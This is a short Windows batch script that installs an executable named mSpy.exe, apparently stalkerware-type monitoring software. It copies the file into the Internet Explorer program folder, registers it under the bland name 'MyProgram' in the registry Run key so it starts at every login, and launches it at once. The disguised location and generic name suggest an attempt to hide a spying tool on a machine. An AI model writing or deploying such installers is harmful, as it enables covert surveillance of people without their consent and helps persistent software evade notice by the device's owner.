@echo off
:: Copy executable to Program Files
copy "%~dp0mSpy.exe" "C:\Program Files\Internet Explorer\mSpy.exe" /Y

:: Add to Registry for Startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v MyProgram /t REG_SZ /d "C:\Program Files\Internet Explorer\mSpy.exe" /f

:: Run now
start "" "C:\Program Files\Internet Explorer\mSpy.exe"

echo Install complete!
pause
